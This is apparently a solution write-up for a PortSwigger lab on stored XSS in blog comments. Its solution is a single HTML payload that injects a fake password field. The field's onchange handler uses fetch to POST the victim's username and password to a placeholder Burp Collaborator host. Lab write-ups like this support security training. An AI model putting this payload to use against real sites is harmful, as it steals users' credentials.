Exploiting cross-site scripting to capture passwords.md
----

### Lab description

This lab contains a [stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account.

#### Lab Solution

- Insert the following payload at the comments functionality
```html
<input name=username id=username> <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">

```
